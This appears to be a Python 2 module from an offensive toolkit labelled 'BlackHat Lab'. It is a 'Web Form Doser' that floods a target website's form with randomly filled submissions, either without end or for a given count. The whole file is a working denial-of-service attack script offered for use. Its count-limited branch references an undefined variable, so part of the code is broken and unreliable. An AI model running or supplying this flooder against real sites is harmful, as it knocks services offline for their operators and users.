# -*- coding: utf-8 -*-

# © BlackHat Lab 2013-2016
# this module needs for make a dos attack on web server
# Developer: DOCTOR_RABB


__NAME__ = 'WFD (Web Form Doser)'
__VERS__ = '0.1f'
__DESC__ = 'You can use this exploit to dos web servers using a web form'
__AUTHORS__ = [ 'DOCTOR_RABB' ]
__TITLE__ = 'web_doser'
__HELP__ = '<url with forms> <form index> <package count (0 for infinity)>'

import urllib2
from mechanize import Browser
from random import randint

from sys import path
import os

path.insert (0, os.path.realpath (os.path.dirname (__file__)) + '../../modules/api')
from output_api import YES, NO

def run (command_args):

    	char_buffer = '`1234567890-=qwertyuiop[]asdfghjkl;\zxcvbnm,./!@#$%~^&*()_+QWERTYUIOP{}ASDFGHJKL:"|ZXCVBNM<>?'

    	b = Browser ()
    	b.open (command_args [1])
    	b.select_form (nr=int (command_args [2]))
	

    	if int (command_args [3]) <= 0:
		try:
			while True:
				b.select_form (nr=int (command_args [2]))
	    	    		for i in b.controls:
		    			if i.name != None:
					     b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
                                             #print i
	            		b.submit ()
				print YES + 'Flood Sent!'
		except Exception as e:
                        print NO + 'Sending Error!'
                        print e

    	else:
		try:
			for i in range (time+1):
				b.select_form (nr=int (command_args [2]))
	    	    		for i in b.controls:
		    		    if i.name != None: b [i.name] = char_buffer [randint (0, len (char_buffer)-1)] * randint (2, 10)
	    	    		b.submit ()
				print YES + 'Flood Sent!'
		except Exception as e:
			print NO + 'Sending Error!'
#			print e
